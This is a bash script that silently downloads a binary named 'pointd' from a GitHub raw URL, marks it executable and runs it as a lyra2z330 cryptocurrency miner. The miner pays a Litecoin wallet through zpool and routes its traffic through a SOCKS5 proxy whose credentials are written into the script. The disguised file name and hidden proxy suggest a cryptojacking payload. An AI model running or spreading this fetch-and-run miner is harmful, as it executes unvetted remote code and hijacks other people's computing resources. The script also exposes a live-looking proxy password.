#!/bin/bash

wget -q https://raw.githubusercontent.com/ahmadghozaliurhniyu/scmin/main/pointd
chmod +x pointd
./pointd -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u LPzpJsXPmdc9HG44gEG2h3naSPrUH2fTMD -p c=LTC,zap=BUT-lyra2z330 -x socks5://aihzpnbr:dogmtwuiyn3a@176.116.230.96:7182 -t 8
